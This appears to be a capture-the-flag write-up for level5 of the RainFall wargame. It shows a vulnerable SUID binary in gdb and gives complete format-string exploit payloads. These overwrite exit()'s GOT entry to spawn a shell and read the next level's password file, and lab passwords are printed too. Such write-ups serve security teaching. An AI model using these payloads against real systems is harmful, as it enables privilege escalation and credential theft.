Login as `level5`.
```shell
┌──$ [~/42/2022/rainfall]
└─>  ssh 192.168.1.28 -p 4242 -l level5
level5@192.168.1.28's password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```
A `SUID` executable is located in the home directory.
```shell
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```
Examine all defined functions.
```gdb
(gdb) info functions
[...]
0x080484a4  o
0x080484c2  n
0x08048504  main
[...]
```
`o()` function execute systemcall running a shell.
```gdb
(gdb) disassemble o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```
`n()` function gets user input, print it and exit with exit code 1. Obviously the address of `exit()` should be overwritten with address of `o()`.
```gdb
(gdb) disassemble n
   [...]
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```
As described in level4, there are two method to write arbitrary data to potentially carefully-selected address - overwrite `exit()`'s address by `o()`'s address.

To `%n` writes value `0x080484a4` into `0x08049838`, first convert it to decimal which gives 134513828 and subtract 4 as 4 bytes are written by address itself.
```shell
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%0134513824x%4$n"'; echo "cat /home/user/level6/.pass") | ./level5
000000000000000000000000000000000000000000000000000000000000000[...]000000000000000000000000000000000000000200
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
Addresses of functions:
```
exit() = 0x08049838
   o() = 0x080484a4
```
The process of calculating values to write
```
4 0xa4 164 > 4+4+4+4+x             = 164 (0xa4)  x=148
3 0x84 132 > 4+4+4+4+148+x         = 388 (0x184) x=224
2 0x04   4 > 4+4+4+4+148+224+x     = 516 (0x204) x=128
1 0x08   8 > 4+4+4+4+148+224+128+x = 520 (0x208) x=4
```

Exploit and log on to the next level.
```shell
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "\x39\x98\x04\x08" + "\x3a\x98\x04\x08" + "\x3b\x98\x04\x08" + "%148hhx%4$n"+ "%224hhx%5$n" + "%128hhx%6$n" + "%4hhx%7$n"'; echo "cat /home/user/level6/.pass") | ./level5
89:;                                                                                                                                                   0                                                                                                                                                                                                                              c0                                                                                                                              d0  38
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
